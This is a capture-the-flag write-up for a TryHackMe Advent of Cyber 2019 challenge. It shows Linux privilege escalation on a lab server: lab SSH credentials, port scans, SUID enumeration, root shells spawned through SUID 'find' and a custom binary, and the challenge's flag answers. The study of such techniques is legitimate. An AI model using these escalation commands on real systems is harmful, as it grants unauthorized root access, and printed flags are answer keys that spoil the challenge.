# This is the Write Up for day 8 challenge of Advent of Cyber 2K19 CTF.

> Pratyush Prakhar (5#1NC#4N) - 12/09/2019

## Description

Elf Holly is suspicious of Elf-ministrator and wants to get onto the root account of a server he setup to see what files are on his account. The problem is, Holly is a low-privileged user.. can you escalate her privileges and hack your way into the root account?

SSH details:
Username: holly
Password: tuD@4vt0G*TU

`This challenge is all about knowing your way around linux and permission sets.`

## Solution

1. We find all the ports open with our nmap on steriods - `rustscan`. The scan file can be found [here](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_8/rustscan/all.nmap). 

2. We can then run a full blown scripts scan against the found ports. Results stored [here](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_8/rustscan/main.nmap). It discloses the found high port is running SSH indeed.

3. We can login using the given credentials. Now let's search a suid file owned by `igor`. Two of them jump out - `nmap` and `find`. Took he find route as described [here](https://gtfobins.github.io/gtfobins/find/#suid). Go explore the the nmap one for yourself.

```bash
holly@ip-10-10-88-219:~$ find / -type f -user igor 2>/dev/null 
/usr/bin/find
/usr/bin/nmap
/home/igor/.bash_history
/home/igor/.viminfo
/home/igor/flag1.txt
holly@ip-10-10-88-219:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 igor igor 221768 Feb  7  2016 /usr/bin/find
holly@ip-10-10-88-219:~$ /usr/bin/find . -exec /bin/bash -p \; -quit
bash-4.3$ whoami
igor
bash-4.3$ cat /home/igor/flag1.txt
THM{******************************}
```

4. Did the same for the `root` owned suid. You can spot the odd one out. If not let linpeas do it's work. And what better than a binary which is already running as root. Makes the work easier.

```bash
holly@ip-10-10-88-219:~$ find / -perm -u=s -user root 2>/dev/null 
/bin/ping
/bin/umount
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/snap/core/7396/bin/mount
/snap/core/7396/bin/ping
/snap/core/7396/bin/ping6
/snap/core/7396/bin/su
/snap/core/7396/bin/umount
/snap/core/7396/usr/bin/chfn
/snap/core/7396/usr/bin/chsh
/snap/core/7396/usr/bin/gpasswd
/snap/core/7396/usr/bin/newgrp
/snap/core/7396/usr/bin/passwd
/snap/core/7396/usr/bin/sudo
/snap/core/7396/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7396/usr/lib/openssh/ssh-keysign
/snap/core/7396/usr/lib/snapd/snap-confine
/snap/core/7396/usr/sbin/pppd
/usr/bin/system-control
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
holly@ip-10-10-88-219:~$ /usr/bin/system-control

===== System Control Binary =====

Enter system command: whoami
root
holly@ip-10-10-88-219:~$ /usr/bin/system-control

===== System Control Binary =====

Enter system command: bash -p
root@ip-10-10-88-219:~# cd /root/        
root@ip-10-10-88-219:/root# cat flag2.txt 
THM{******************************}
```


## Brownie Points

1. What port is SSH running on? - **65534**.

2. Find and run a file as igor. Read the file /home/igor/flag1.txt- **THM{d3f0708bdd9accda7f937d013eaf2cd8}**.

3. Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file? - **THM{8c8211826239d849fa8d6df03749c3a2}**.


## Extra Treats.

1. Linpeas file here can give you more insight - [file](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_8/tmp/lin_holly.out).





